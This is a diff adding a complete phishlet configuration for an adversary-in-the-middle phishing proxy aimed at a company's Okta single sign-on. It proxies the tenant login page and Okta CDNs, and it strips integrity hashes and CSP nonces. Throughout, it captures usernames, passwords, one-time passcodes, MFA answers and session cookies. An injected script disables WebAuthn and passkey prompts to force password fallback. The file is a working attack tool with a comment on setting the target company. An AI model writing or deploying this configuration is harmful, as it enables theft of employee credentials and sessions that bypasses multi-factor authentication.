@@ -1,0 +1,95 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+# Set tenant to the target's Okta subdomain before enabling:
+#   phishlet set okta tenant targetcompany
+params:
+  - name: 'tenant'
+    value: 'company'
+
+proxy_hosts:
+  # Tenant login page (OIE and Classic)
+  - {phish_sub: 'okta', orig_sub: '{tenant}', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
+  # Okta Sign-In Widget CDN — required for login form to render
+  - {phish_sub: 'op1cdn', orig_sub: 'op1static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ok12cdn', orig_sub: 'ok12static', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+  # Current global CDN (OIE widget)
+  - {phish_sub: 'globalcdn', orig_sub: 'global', domain: 'oktacdn.com', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # Strip SRI integrity hashes
+  - {triggers_on: '{tenant}.okta.com', orig_sub: '{tenant}', domain: 'okta.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: '{tenant}.okta.com', orig_sub: '{tenant}', domain: 'okta.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Strip CSP nonce attributes
+  - {triggers_on: '{tenant}.okta.com', orig_sub: '{tenant}', domain: 'okta.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: '{tenant}.okta.com', orig_sub: '{tenant}', domain: 'okta.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Rewrite all okta.com and oktacdn.com origin references in tenant responses
+  - {triggers_on: '{tenant}.okta.com', orig_sub: '{tenant}', domain: 'okta.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: '{tenant}.okta.com', orig_sub: 'op1static', domain: 'oktacdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: '{tenant}.okta.com', orig_sub: 'ok12static', domain: 'oktacdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: '{tenant}.okta.com', orig_sub: 'global', domain: 'oktacdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  # Primary session cookie — set on the tenant subdomain
+  - domain: '{tenant}.okta.com'
+    keys: ['sid', 'DT,opt', 'idx,opt']
+    type: 'cookie'
+  # Shared okta.com-level cookies (OIDC state, device trust)
+  - domain: '.okta.com'
+    keys: ['sid,opt', 'DT,opt', 'okta-oauth-state,opt', 'okta-oauth-nonce,opt', 'okta-oauth-code-verifier,opt']
+    type: 'cookie'
+
+credentials:
+  # Classic Okta username field
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+
+  # Classic Okta password field
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # OIE (Okta Identity Engine) username field in /idp/idx/identify JSON POST
+    - {key: 'identifier', search: '(.*)', type: 'post'}
+    # OIE password / TOTP code in /idp/idx/challenge/answer JSON POST
+    - {key: 'passcode', search: '(.*)', type: 'post'}
+    # MFA: push, TOTP, SMS codes
+    - {key: 'answer', search: '(.*)', type: 'post'}
+    - {key: 'stateToken', search: '(.*)', type: 'post'}
+
+auth_urls:
+  # Classic: session cookie redirect after /api/v1/authn
+  - '/login/sessionCookieRedirect'
+  # OIE: terminal step redirects to app
+  - '/app/.*'
+  - '/home/.*'
+  # OIDC token exchange completion
+  - '/oauth2/v1/token'
+  - '/oauth2/.*/v1/token'
+
+js_inject:
+  # Disable WebAuthn / passkey challenges — force password fallback
+  - trigger_domains: ['{tenant}.okta.com']
+    trigger_paths: ['.*']
+    script: |
+      (function(){
+        if(window.PublicKeyCredential){
+          window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){return Promise.resolve(false);};
+          window.PublicKeyCredential.isConditionalMediationAvailable=function(){return Promise.resolve(false);};
+        }
+        if(navigator.credentials&&navigator.credentials.get){
+          var _orig=navigator.credentials.get.bind(navigator.credentials);
+          navigator.credentials.get=function(o){
+            if(o&&o.publicKey)return Promise.reject(new DOMException('Not allowed','NotAllowedError'));
+            return _orig(o);
+          };
+        }
+      })();
+
+login:
+  domain: '{tenant}.okta.com'
+  path: '/'
